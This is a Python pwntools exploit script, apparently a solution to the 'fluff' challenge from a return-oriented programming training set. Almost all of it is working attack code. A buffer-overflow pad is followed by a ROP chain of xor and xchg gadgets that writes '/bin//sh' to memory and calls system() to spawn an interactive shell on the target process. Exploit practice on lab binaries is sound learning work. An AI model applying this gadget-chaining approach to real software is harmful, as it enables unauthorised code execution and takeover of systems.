from pwn import *

data = 0x601054

system_plt = 0x4005e0
 
def writebinsh():
  trash = "AAAA"*2
  binsh = "/bin//sh"
  
  ret  = ""  
  ### get data in r11 ###
  # clear r11 (get zero)
  ret += p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
  ret += trash 
  ret += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret;
  ret += p64(data)

  # r12 into r11 (xor with zero)
  ret += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
  ret += trash
  # xchange r11 and r10 (get address to r10)
  ret += p64(0x0000000000400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
  ret += trash

  ### get /bin in r10 ### >>> DO THIS AFTER get data into ecx <<<
  # clear r11 (get zero)
  ret += p64(0x0000000000400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
  ret += trash
  ret += p64(0x0000000000400832) # pop r12; mov r13d, 0x604060; ret;
  ret += binsh
  # r12 into r11 (xor with zero)
  ret += p64(0x000000000040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
  ret += trash

  ret += p64(0x000000000040084e) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
  ret += trash # for r13
  # as next instruction in gadget will xor [r10] with r12b (lower 8 bit of r12)
  ret += p64(0x0000000000000000)  # for r12

  return ret

def Callsystem_plt(system_plt_addr):
  ret = ""
  ret += p64(0x00000000004008c3) # pop rdi; ret;
  ret += p64(data)
  ret += p64(system_plt)
  return ret
  
pad = 'A' * 40

ret = ""

ret += writebinsh()
ret += Callsystem_plt(system_plt)

payload = pad + ret

elf = ELF('fluff')

io = process(elf.path)
io.recvuntil("> ")
io.sendline(payload)
io.interactive()